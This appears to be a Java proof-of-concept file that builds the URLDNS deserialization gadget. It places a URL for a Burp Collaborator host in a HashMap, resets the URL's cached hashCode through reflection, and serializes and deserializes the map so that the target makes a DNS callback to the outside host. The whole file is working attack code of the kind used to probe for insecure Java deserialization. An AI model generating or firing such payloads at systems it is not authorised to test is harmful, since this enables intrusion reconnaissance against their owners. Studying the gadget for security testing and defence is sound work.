package gadget;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS1 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        URL url=new URL("http://sxttgi58oigfsmqavm2u66tvym4cs1.burpcollaborator.net");
        hashmap.put(url,"Squirt1e");
        Class clazz=url.getClass();
        Field hashcode=clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url,-1);

        serialize(hashmap);
        unserialize();


    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("URLDNS.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("URLDNS.bin"));
        objectInputStream.readObject();
    }
}
